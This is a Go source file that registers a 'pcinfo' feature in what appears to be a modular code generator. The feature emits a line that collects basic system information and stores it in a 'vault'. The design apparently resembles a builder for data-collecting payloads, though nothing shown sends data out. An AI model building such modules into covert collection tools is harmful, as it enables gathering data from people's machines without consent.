package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "pcinfo",
		Description: "Grabs general basic system information",
		ReturnsData: true,
		Args:        []Arg{},
		Dependencies: []string{
			"system.lib.go",
		},
		GenerateCode: func(args FeatureSetArgsList) (string, error) {
			output := "vault.StoreTable(ToTable(GetSysInfo()))\n"

			return output, nil
		},
	})
}
